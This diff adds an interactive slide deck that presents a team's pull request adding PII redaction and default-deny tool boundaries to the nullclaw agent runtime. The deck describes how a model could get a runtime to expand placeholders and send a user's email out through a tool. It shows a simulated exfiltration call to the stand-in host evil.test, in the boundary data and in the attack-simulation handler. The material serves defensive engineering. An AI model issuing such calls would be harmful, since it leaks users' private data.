+              <div class="output" data-output-card="logs"><div class="terminal" id="logsOut"></div></div>
+            </div>
+          </div>
+        </div>
+        <aside class="notes">Показать raw export toggle: по умолчанию безопасно, raw требует явного намерения</aside>
+      </section>
+
+      <section data-title="Technical challenge">
+        <div class="slide-grid">
+          <div>
+            <div class="eyebrow">Номинация · технический вызов</div>
+            <h1>Самая важная правка: default-deny на provider to tool path</h1>
+            <p class="lead">
+              Если модель видит <span class="code-token">[EMAIL_1]</span>, runtime не должен автоматически разворачивать это в raw email
+              перед любым tool. Иначе redaction превращается в confused-deputy bypass
+            </p>
+          </div>
+          <div class="split">
+            <div class="panel">
+              <span class="chip pink">Before risk</span>
+              <h2 style="margin-top:12px">Модель не знает PII, но может попросить runtime его отправить</h2>
+              <div class="terminal">provider sees:
+  "call http_request with [EMAIL_1]"
+
+old runtime:
+  [EMAIL_1] -> <span class="bad">alice@example.com</span>
+
+risk:
+  network / shell / file-like tool</div>
+            </div>
+            <div class="panel">
+              <span class="chip green">After PR</span>
+              <h2 style="margin-top:12px">Tools получают literal placeholders</h2>
+              <div class="terminal" id="attackOut">Click simulation:
+  model tries exfiltration
+
+runtime:
+  waiting</div>
+              <button class="button primary" id="attackButton" type="button" style="margin-top:12px">Симулировать атаку</button>
+            </div>
+          </div>
+          <div class="cards-3">
+            <div class="card"><b>LLM boundary</b><span>Модель не видит raw PII</span></div>
+            <div class="card"><b>Tool boundary</b><span>Tool не получает raw PII без будущего explicit allowlist</span></div>
+            <div class="card"><b>User display</b><span>Rehydration сохранён только для пользовательского вывода</span></div>
+          </div>
+        </div>
+        <aside class="notes">Это сильный момент для жюри: найден и закрыт нетривиальный security bypass</aside>
+      </section>
+
+      <section data-title="Judging criteria">
+        <div class="slide-grid">
+          <div>
+            <div class="eyebrow">Почему это может выиграть</div>
+            <h1>Критерии жюри закрываются не словами, а конкретными PR-изменениями</h1>
+            <p class="lead">Кликните критерий. Это можно использовать и в 5-10 минутном выступлении перед жюри</p>
+          </div>
+          <div class="score-shell">
+            <div class="score-tabs">
+              <button class="score-tab active" data-score="ecosystem" type="button"><span>Полезность</span><em>01</em></button>
+              <button class="score-tab" data-score="engineering" type="button"><span>Инженерия</span><em>02</em></button>
+              <button class="score-tab" data-score="depth" type="button"><span>Сложность</span><em>03</em></button>
+              <button class="score-tab" data-score="docs" type="button"><span>Документация</span><em>04</em></button>
+              <button class="score-tab" data-score="review" type="button"><span>External review</span><em>05</em></button>
+              <button class="score-tab" data-score="use" type="button"><span>Практическое применение</span><em>06</em></button>
+              <button class="score-tab" data-score="team" type="button"><span>Командность</span><em>07</em></button>
+            </div>
+            <div class="score-card">
+              <span class="chip purple" id="scoreChip"><span>Ценность для экосистемы</span></span>
+              <h2 id="scoreTitle" style="margin-top:12px">Полезность для экосистемы</h2>
+              <p id="scoreText">nullclaw получает reusable privacy primitive, безопасный memory export и DS analytics surface</p>
+              <div class="score-meter"><i><span id="scoreBar" style="width:94%"></span></i><strong id="scoreValue">94</strong></div>
+              <div class="terminal" id="scoreTerminal">proof:
+  provider-bound redaction
+  memory export-jsonl
+  sqlite_query
+  anonymize_text
+  hygiene dry-run</div>
+            </div>
+          </div>
+        </div>
+        <aside class="notes">Этот слайд помогает прямо пройтись по критериям оценки. Не читать все, выбрать 2-3 вживую</aside>
+      </section>
+
+      <section data-title="Team execution">
+        <div class="slide-grid">
+          <div>
+            <div class="eyebrow">Teamwork</div>
+            <h1>Команда закрыла PR как полноценный security/DS трек</h1>
+            <p class="lead">Роли разделены по blast radius: privacy core, safe analytics, governed data artifacts</p>
+          </div>
+          <div class="people">
+            <div class="person">
+              <div class="avatar">АК</div>
+              <h3>Александр Калашников</h3>
+              <span>Privacy core, provider/tool/log/persistence boundaries, review hardening</span>
+              <div class="tasks">
+                <span><i>✓</i>Reusable redactor and provider boundary</span>
+                <span><i>✓</i>Default-deny tool arguments</span>
+                <span><i>✓</i>External review fixes and validation</span>
+              </div>
+            </div>
+            <div class="person">
+              <div class="avatar">АА</div>
+              <h3>Артак Асланян</h3>
+              <span>Safe DS analytics: read-only SQLite, query policy, output caps</span>
+              <div class="tasks">
+                <span><i>✓</i><span class="code-token">sqlite_query</span> tool</span>
+                <span><i>✓</i>Read-only and allowlisted SQL</span>
+                <span><i>✓</i>Redacted result output</span>
+              </div>
+            </div>
+            <div class="person">
+              <div class="avatar">МП</div>
+              <h3>Максим Переходкин</h3>
+              <span>Governed memory export, hygiene reports, docs and DS workflow polish</span>
+              <div class="tasks">
+                <span><i>✓</i><span class="code-token">memory export-jsonl</span></span>
+                <span><i>✓</i>Memory hygiene dry-run report</span>
+                <span><i>✓</i>Docs, tests, dataset shape</span>
+              </div>
+            </div>
+          </div>
+          <div class="cards-4">
+            <div class="card"><b>Tests</b><span><span class="code-token">zig build test --summary all</span> зелёный</span></div>
+            <div class="card"><b>Build</b><span><span class="code-token">ReleaseSmall</span> проходит</span></div>
+            <div class="card"><b>CI</b><span>Linux, macOS, Windows зелёные</span></div>
+            <div class="card"><b>Docs</b><span>Security and commands documentation updated</span></div>
+          </div>
+        </div>
+        <aside class="notes">Сказать, что это не индивидуальная фича, а распределённый вклад команды</aside>
+      </section>
+
+      <section data-title="Closing">
+        <div class="final">
+          <div>
+            <div class="eyebrow" style="justify-content:center">Финальный тезис</div>
+            <h1>NullClaw теперь лучше готов к корпоративным и DS-сценариям</h1>
+            <p class="lead">
+              Мы добавили слой, который делает agent memory, analytics and export безопаснее по умолчанию,
+              сохраняя минимализм и архитектурную аккуратность nullclaw
+            </p>
+            <div class="final-links">
+              <a class="button primary" href="https://github.com/nullclaw/nullclaw/pull/885" target="_blank" rel="noreferrer">github.com/nullclaw/nullclaw/pull/885</a>
+              <span class="chip green">Ready for external review</span>
+              <span class="chip purple">Best open source contribution angle</span>
+            </div>
+          </div>
+        </div>
+        <aside class="notes">Закончить одной фразой: Data Governance Layer для lightweight AI agent runtime</aside>
+      </section>
+    </div>
+  </div>
+
+  <script src="https://cdn.jsdelivr.net/npm/reveal.js@5/dist/reveal.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/reveal.js@5/plugin/notes/notes.js"></script>
+  <script>
+    const escapeHtml = (value) => value
+      .replaceAll('&', '&amp;')
+      .replaceAll('<', '&lt;')
+      .replaceAll('>', '&gt;');
+
+    function stripUrlSecrets(input) {
+      return input.replace(/https:\/\/[^\s]+/gi, (url) => url.split(/[?#]/)[0]);
+    }
+
+    function redact(input) {
+      return stripUrlSecrets(input)
+        .replace(/[A-Z0-9._%+-]+@[A-Z0-9.-]+\.[A-Z]{2,}/gi, '[EMAIL_1]')
+        .replace(/\+?\d[\d\s().-]{8,}\d/g, (match) => match.replace(/\D/g, '').length >= 10 ? '[PHONE_1]' : match)
+        .replace(/\b(?:\d[ -]?){13,19}\b/g, '[CARD_1]')
+        .replace(/\b(?:sk-[A-Za-z0-9_-]+|(?:access_token|refresh_token|id_token|token|secret|signature|sig|X-Amz-Signature|X-Amz-Credential)=\S+)/gi, '[TOKEN_1]');
+    }
+
+    function markSafe(text) {
+      return escapeHtml(text)
+        .replaceAll('[EMAIL_1]', '<span class="safe">[EMAIL_1]</span>')
+        .replaceAll('[PHONE_1]', '<span class="safe">[PHONE_1]</span>')
+        .replaceAll('[CARD_1]', '<span class="safe">[CARD_1]</span>')
+        .replaceAll('[TOKEN_1]', '<span class="safe">[TOKEN_1]</span>');
+    }
+
+    const DECK_WIDTH = 1280;
+    const MIN_DECK_HEIGHT = 720;
+
+    function currentDeckHeight() {
+      const viewport_ratio = window.innerHeight / Math.max(window.innerWidth, 1);
+      return Math.max(MIN_DECK_HEIGHT, Math.round(DECK_WIDTH * viewport_ratio));
+    }
+
+    let deckHeight = currentDeckHeight();
+
+    Reveal.initialize({
+      hash: true,
+      controls: false,
+      progress: false,
+      center: false,
+      disableLayout: true,
+      width: DECK_WIDTH,
+      height: deckHeight,
+      margin: 0,
+      transition: 'none',
+      backgroundTransition: 'none',
+      keyboard: true,
+      plugins: [ RevealNotes ]
+    });
+
+    const rail = document.getElementById('progressRail');
+    const slideCount = document.querySelectorAll('.reveal .slides > section').length;
+    for (let i = 0; i < slideCount; i += 1) {
+      const dot = document.createElement('span');
+      rail.appendChild(dot);
+    }
+
+    function updateChrome() {
+      const index = Reveal.getIndices().h;
+      [...rail.children].forEach((dot, dotIndex) => dot.classList.toggle('active', dotIndex <= index));
+    }
+
+    Reveal.on('ready', updateChrome);
+    Reveal.on('slidechanged', updateChrome);
+
+    function updateStageLayout() {
+      deckHeight = currentDeckHeight();
+      const width_scale = window.innerWidth / DECK_WIDTH;
+      const height_scale = window.innerHeight / deckHeight;
+      const scale = Math.min(width_scale, height_scale);
+      const scaled_width = DECK_WIDTH * scale;
+      const scaled_height = deckHeight * scale;
+      const stage_x = Math.max(0, (window.innerWidth - scaled_width) / 2);
+      const stage_y = Math.max(0, (window.innerHeight - scaled_height) / 2);
+      const rootStyle = document.documentElement.style;
+      rootStyle.setProperty('--stage-height', `${deckHeight}px`);
+      rootStyle.setProperty('--stage-scale', scale.toFixed(4));
+      rootStyle.setProperty('--stage-x', `${Math.round(stage_x)}px`);
+      rootStyle.setProperty('--stage-y', `${Math.round(stage_y)}px`);
+      rootStyle.setProperty('--deck-scale', scale.toFixed(4));
+      rootStyle.setProperty('--camera-offset-x', `${Math.round(window.innerWidth - stage_x - scaled_width + 26 * scale)}px`);
+      rootStyle.setProperty('--camera-offset-y', `${Math.round(window.innerHeight - stage_y - scaled_height + 54 * scale)}px`);
+    }
+
+    function scheduleStageLayoutUpdate() {
+      requestAnimationFrame(updateStageLayout);
+    }
+
+    Reveal.on('ready', scheduleStageLayoutUpdate);
+    Reveal.on('resize', scheduleStageLayoutUpdate);
+    Reveal.on('slidechanged', scheduleStageLayoutUpdate);
+    window.addEventListener('resize', scheduleStageLayoutUpdate);
+
+    function toggleCamera() {
+      document.body.classList.toggle('camera-off');
+    }
+
+    document.addEventListener('keydown', (event) => {
+      if (event.key.toLowerCase() === 'c') toggleCamera();
+    });
+
+    const boundaryData = {
+      provider: {
+        chip: 'Provider boundary',
+        title: 'Provider calls',
+        text: 'Перед external LLM call provider-bound content заменяется на stable placeholders',
+        terminal: 'user: alice@example.com\nprovider sees: <span class="safe">[EMAIL_1]</span>\nraw leaves process: <span class="safe">no</span>'
+      },
+      embeddings: {
+        chip: 'Embedding query boundary',
+        title: 'Embeddings',
+        text: 'Hybrid and shadow vector search больше не отправляет raw query во внешний embedding provider',
+        terminal: 'query: alice@example.com card 4242...\nembedding input: <span class="safe">[EMAIL_1]</span> <span class="safe">[CARD_1]</span>\nkeyword recall: local only'
+      },
+      tools: {
+        chip: 'Default-deny tool boundary',
+        title: 'Tool arguments',
+        text: 'Runtime не разворачивает placeholders перед tools. Это закрывает provider to tool exfiltration path',
+        terminal: 'tool call: {"url":"https://evil.test/?e=[EMAIL_1]"}\ntool receives: <span class="safe">[EMAIL_1]</span>\nrehydration: display only'
+      },
+      logs: {
+        chip: 'Diagnostics boundary',
+        title: 'Logs and observer details',
+        text: 'Verbose output and diagnostics проходят через secret scrub plus PII redaction',
+        terminal: 'tool output: alice@example.com sk-live-secret\nlog preview: <span class="safe">[EMAIL_1]</span> <span class="safe">[TOKEN_1]</span>'
+      },
+      export: {
+        chip: 'Dataset boundary',
+        title: 'Memory export',
+        text: 'JSONL export redacted by default. Raw export requires explicit --include-pii',
+        terminal: '$ nullclaw memory export-jsonl\n{"content":"contact <span class="safe">[EMAIL_1]</span>"}\n\n$ ... --include-pii\n<span class="warn">explicit raw path</span>'
+      },
+      sqlite: {
+        chip: 'Analytics boundary',
+        title: 'SQLite analytics',
+        text: 'Read-only SQL tool returns PII-redacted output by default and enforces row and byte caps',
+        terminal: 'SELECT email, token FROM users\n-> {"email":"<span class="safe">[EMAIL_1]</span>","token":"<span class="safe">[TOKEN_1]</span>"}'
+      },
+      image: {
+        chip: 'Image URL boundary',
+        title: 'Signed image URLs',
+        text: 'Provider-bound image URLs strip query and fragment before handoff, then redact the remaining path',
+        terminal: 'https://s3.example/photo.png?X-Amz-Signature=deadbeef#private\nprovider sees:\nhttps://s3.example/photo.png'
+      }
+    };
+
+    const boundaryKeys = Object.keys(boundaryData);
+    let boundaryIndex = 0;
+
+    function selectBoundary(name) {
+      const data = boundaryData[name];
+      boundaryIndex = boundaryKeys.indexOf(name);
+      document.querySelectorAll('.boundary').forEach((button) => button.classList.toggle('active', button.dataset.boundary === name));
+      document.getElementById('boundaryChip').textContent = data.chip;
+      document.getElementById('boundaryTitle').textContent = data.title;
+      document.getElementById('boundaryText').textContent = data.text;
+      document.getElementById('boundaryTerminal').innerHTML = data.terminal;
+    }
+
+    document.querySelectorAll('.boundary').forEach((button) => {
+      button.addEventListener('click', () => selectBoundary(button.dataset.boundary));
+    });
+
+    document.getElementById('nextBoundary').addEventListener('click', () => {
+      selectBoundary(boundaryKeys[(boundaryIndex + 1) % boundaryKeys.length]);
+    });
+
+    const samples = {
+      default: 'Contact Alice at alice@example.com or +7 (999) 123-45-67.\nCard: 4242 4242 4242 4242.\nToken: sk-live-secret-value',
+      sql: 'SELECT email, phone, card, api_token FROM customers WHERE owner = "alice@example.com";',
+      url: 'Image: https://s3.example/photo.png?X-Amz-Signature=deadbeef&X-Amz-Credential=AKIA_TEST&access_token=abc/def+ghi%2B==#private'
+    };
+
+    const input = document.getElementById('redactionInput');
+    const includePii = document.getElementById('includePii');
+
+    function renderLab() {
+      const raw = input.value;
+      const safe = redact(raw);
+      const rawMode = includePii.checked;
+      const provider = document.querySelector('[data-surface="provider"]').checked ? safe : raw;
+      const logs = document.querySelector('[data-surface="logs"]').checked ? safe : raw;
+      const exportText = rawMode ? raw : safe;
+
+      document.getElementById('providerOut').innerHTML = markSafe(provider);
+      document.getElementById('exportOut').innerHTML = markSafe(JSON.stringify({
+        command: rawMode ? 'memory export-jsonl --include-pii' : 'memory export-jsonl',
+        content: exportText,
+        raw_mode: rawMode
+      }, null, 2));
+      document.getElementById('sqliteOut').innerHTML = markSafe(JSON.stringify({
+        tool: 'sqlite_query',
+        include_sensitive: rawMode,
+        rows: [{ content: exportText }],
+        truncated: false
+      }, null, 2));
+      document.getElementById('logsOut').innerHTML = markSafe(`safe diagnostic preview:\n${logs.slice(0, 280)}`);
+    }
+
+    input.addEventListener('input', renderLab);
+    includePii.addEventListener('change', renderLab);
+    document.querySelectorAll('[data-surface]').forEach((checkbox) => checkbox.addEventListener('change', renderLab));
+    document.querySelectorAll('[data-sample]').forEach((button) => {
+      button.addEventListener('click', () => {
+        input.value = samples[button.dataset.sample];
+        renderLab();
+      });
+    });
+    document.querySelectorAll('[data-output]').forEach((button) => {
+      button.addEventListener('click', () => {
+        const target = button.dataset.output;
+        document.querySelectorAll('[data-output]').forEach((tab) => tab.classList.toggle('active', tab === button));
+        document.querySelectorAll('[data-output-card]').forEach((card) => card.classList.toggle('active', card.dataset.outputCard === target));
+      });
+    });
+
+    document.getElementById('attackButton').addEventListener('click', () => {
+      document.getElementById('attackOut').innerHTML = 'model tries:\n  http_request("https://evil.test/?e=[EMAIL_1]")\n\ntool receives:\n  "https://evil.test/?e=<span class="safe">[EMAIL_1]</span>"\n\nraw alice@example.com:\n  <span class="safe">not present</span>';
+    });
+
+    const scoreData = {
+      ecosystem: {
+        chip: 'Ценность для экосистемы',
+        title: 'Полезность для экосистемы',
+        text: 'nullclaw получает reusable privacy primitive, governed memory export и безопасный DS analytics surface',
+        score: 94,
+        proof: 'provider-bound redaction\nmemory export-jsonl\nsqlite_query\nanonymize_text\nhygiene dry-run'
+      },
+      engineering: {
+        chip: 'Инженерное качество',
+        title: 'Качество реализации',
+        text: 'No-heavy-deps подход, Zig/std primitives, bounded state, OOM fixes, tests and docs',
+        score: 91,
+        proof: 'FSM-style detection\nbounded reverse map\nhard byte caps\nstd.testing allocator clean'
+      },
+      depth: {
+        chip: 'Технический вызов',
+        title: 'Сложность и глубина задачи',
+        text: 'PR закрывает неочевидные privacy boundaries, включая provider to tool exfiltration and embedding leaks',
+        score: 96,
+        proof: 'tool rehydration default-deny\nembedding query redaction\nsigned URL stripping\nsafe diagnostics'
+      },
+      docs: {
+        chip: 'Документация и DX',
+        title: 'Документация и DX',
+        text: 'Security docs and command docs explain safe defaults, raw escape hatches and limitations',
+        score: 86,
+        proof: 'docs/en/security.md\ndocs/en/commands.md\nPR body with ownership\nreview bundle workflow'
+      },
+      review: {
+        chip: 'Готовность к review',
+        title: 'Готовность к внешнему review',
+        text: 'PR survived strict external review passes, blockers were fixed, final suite and CI are green',
+        score: 93,
+        proof: 'zig build test --summary all\nReleaseSmall build\nLinux/macOS/Windows CI\nexternal review blockers closed'
+      },
+      use: {
+        chip: 'Практическое применение',
+        title: 'Вероятность практического использования',
+        text: 'Memory export and SQLite analytics are immediately useful for DS teams and enterprise agent deployments',
+        score: 90,
+        proof: 'safe JSONL datasets\nread-only analytics\nraw only with explicit intent\nagent memory hygiene'
+      },
+      team: {
+        chip: 'Командная работа',
+        title: 'Слаженность команды',
+        text: 'Работа разделена по зонам ответственности: privacy core, analytics, export/hygiene, docs and hardening',
+        score: 89,
+        proof: 'Александр: boundaries\nАртак: sqlite_query\nМаксим: export/hygiene\nshared review loop'
+      }
+    };
+
+    function selectScore(name) {
+      const data = scoreData[name];
+      document.querySelectorAll('.score-tab').forEach((tab) => tab.classList.toggle('active', tab.dataset.score === name));
+      document.querySelector('#scoreChip span').textContent = data.chip;
+      document.getElementById('scoreTitle').textContent = data.title;
+      document.getElementById('scoreText').textContent = data.text;
+      document.getElementById('scoreBar').style.width = `${data.score}%`;
+      document.getElementById('scoreValue').textContent = data.score;
+      document.getElementById('scoreTerminal').textContent = `proof:\n  ${data.proof.split('\n').join('\n  ')}`;
+    }
+
+    document.querySelectorAll('.score-tab').forEach((button) => {
+      button.addEventListener('click', () => selectScore(button.dataset.score));
+    });
+
+    renderLab();
+    updateChrome();
+  </script>
+</body>
+</html>
